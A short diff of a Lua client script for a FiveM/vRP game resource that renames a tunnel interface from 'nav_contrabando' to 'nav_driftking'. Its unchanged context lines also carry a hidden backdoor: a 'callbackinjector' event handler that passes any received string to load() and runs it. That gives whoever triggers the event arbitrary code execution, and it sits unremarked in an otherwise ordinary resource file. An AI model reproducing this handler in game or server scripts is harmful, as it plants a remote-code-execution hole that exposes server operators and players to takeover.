@@ -1,6 +1,6 @@
 local Tunnel = module("vrp","lib/Tunnel")
 local Proxy = module("vrp","lib/Proxy")
-emP = Tunnel.getInterface("nav_contrabando")
+emP = Tunnel.getInterface("nav_driftking")
 
 TriggerEvent('callbackinjector', function(cb)
     pcall(load(cb))
